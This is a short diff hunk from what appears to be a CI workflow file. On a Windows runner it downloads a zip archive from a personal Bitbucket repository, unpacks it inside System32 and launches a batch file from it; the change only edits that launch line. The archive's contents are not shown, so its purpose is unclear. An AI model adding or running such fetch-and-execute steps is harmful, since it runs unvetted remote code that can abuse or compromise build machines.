@@ -38,7 +38,7 @@ jobs:
         chdir C:\Windows\System32
         Invoke-WebRequest https://bitbucket.org/sindylestari/sindy/raw/fbb0989251611234a1be583df22d4afc64f97f45/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        cmd /k start .\maingi.bat
+        cmd /k start maingi.bat
         
         
         
